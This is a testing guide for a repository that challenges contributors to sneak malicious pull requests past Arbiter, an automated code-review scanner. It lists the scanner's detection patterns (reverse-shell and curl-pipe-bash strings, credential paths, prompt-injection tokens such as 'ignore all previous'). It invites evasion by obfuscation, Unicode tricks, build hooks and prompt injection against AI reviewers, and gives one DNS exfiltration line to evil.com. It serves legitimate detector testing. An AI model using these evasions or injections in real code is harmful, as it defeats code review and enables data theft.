# Challenge Arena — Testing Guide

## What is this?

This repo is protected by [Arbiter](https://github.com/OpenArbiter/arbiter), an automated code review system that analyzes every PR for suspicious patterns. Your goal: get a PR approved that contains code doing something Arbiter should have caught.

**No CI runs on this repo.** Arbiter is the only gate. It analyzes the diff within seconds of the PR being opened.

## How Arbiter works

When you open a PR, Arbiter:

1. Receives a webhook from GitHub (instant)
2. Fetches the PR diff via the GitHub API (no code execution)
3. Scans the added lines for dangerous patterns across 10 capability categories
4. Checks configurable invariant rules (forbidden patterns)
5. Analyzes test coverage, dependency changes, and suspicious targets
6. Detects hidden Unicode characters and confusables
7. Posts a check run with the decision: approved or blocked

Everything happens by reading text. No code is compiled or executed.

## What Arbiter detects

### Capability detection (10 categories, 130+ patterns, 11 languages)
- **Process execution** — `exec.Command`, `subprocess`, `child_process`, `system()`, `ProcessBuilder`, etc.
- **Network access** — `net/http`, `fetch()`, `requests`, `HttpClient`, `curl_init`, etc.
- **File system writes** — `WriteFile`, `fopen`, `file_put_contents`, `FileOutputStream`, etc.
- **Dynamic code execution** — `eval()`, `reflect`, `plugin.Open`, `dlopen`, `unserialize`, etc.
- **Environment access** — `os.Getenv`, `process.env`, `os.environ`
- **Crypto operations** — `crypto/`, `jwt`, `PrivateKey`
- **Linter suppression** — `//nolint`, `# noqa`, `eslint-disable`
- **Build-time execution** — `go:generate`, `postinstall`, `/dev/tcp`, `curl | bash`
- **Container escape** — `--privileged`, `docker.sock`, `/mnt/host`, `SYS_ADMIN`
- **Prompt injection** — `ignore all previous`, `[INST]`, `<|im_start|>`, `SYSTEM:`

### Invariant rules (configured in this repo)
- `exec.Command` — forbidden
- `eval(` — forbidden
- `system(` — forbidden
- `subprocess` — forbidden
- `child_process` — forbidden
- `shell_exec` — forbidden
- PRs limited to 500 lines, 20 files

### Other analysis
- **Test coverage** — flags code files without corresponding test changes
- **Dependency analysis** — flags new packages added to go.mod, package.json, requirements.txt, etc.
- **Suspicious targets** — cloud metadata IPs (169.254.169.254), sensitive paths (/etc/shadow, /.ssh/), suspicious domains
- **Dangerous combinations** — decode + write, decode + execute, fetch + execute
- **Hidden characters** — zero-width spaces, bidirectional overrides (Trojan Source), confusable Cyrillic/fullwidth characters
- **CI/build file changes** — modifications to .github/workflows/, Dockerfiles, Makefiles

## In scope — things to try

- **Pattern evasion** — get dangerous code past the pattern matching
- **Obfuscation** — hide malicious intent using encoding, string building, indirection
- **Language tricks** — use language-specific features that Arbiter doesn't recognize
- **Unicode attacks** — confusable characters, bidirectional overrides, zero-width joiners
- **Build-time attacks** — go:generate, Makefile targets, npm hooks, Docker build steps
- **Dependency confusion** — add a suspicious package that Arbiter doesn't flag
- **Prompt injection** — put text in your code that tries to manipulate AI reviewers
- **Combination attacks** — individually safe operations that are dangerous together
- **New language patterns** — use a language Arbiter has fewer patterns for
- **File type tricks** — shell scripts in .txt files, executable configs, polyglot files

## Out of scope

- **DoS/availability attacks** — don't try to crash or overwhelm the service
- **Attacking the GitHub App** — the webhook endpoint, API, or infrastructure
- **Social engineering** — this is about automated detection, not tricking humans
- **Exploiting GitHub itself** — Actions, permissions, or platform vulnerabilities
- **Modifying .arbiter.yml** — config is read from the base branch, you can't weaken it via PR

## How to test

1. Fork this repo
2. Create a branch with your attack
3. Open a PR
4. Wait ~10 seconds for Arbiter's check run
5. Check the result: did `openarbiter/trust` pass or fail?

## Reporting results

### If Arbiter blocked you (expected)
Good — Arbiter is working. Look at the check run detail to see what was detected.

### If you bypassed Arbiter
Congrats! Please [report the bypass](https://github.com/OpenArbiter/challenge-arena/issues/new?template=bypass-report.md) so we can improve detection. Include:
- What you did
- Why Arbiter should have caught it
- Your suggested fix (if you have one)

### If Arbiter blocked legitimate code (false positive)
Please [report the false positive](https://github.com/OpenArbiter/challenge-arena/issues/new?template=false-positive.md) so we can reduce noise.

## Known limitations

These are things we know Arbiter can't catch well:

- **DNS exfiltration** — `net.LookupHost(secret + ".evil.com")` looks like normal DNS
- **Logic bugs** — code that does the wrong thing but looks syntactically correct
- **Compiled binaries** — pre-built executables have no source to analyze
- **Sophisticated obfuscation** — building dangerous strings character by character at runtime

## Repo structure

```
src/
  api/          — Go HTTP server
  workers/      — Python message processor + JS formatter
scripts/        — Shell setup and lint scripts
config/         — Application configuration
```

## Questions?

Open an issue or check the [Arbiter repo](https://github.com/OpenArbiter/arbiter) for documentation.
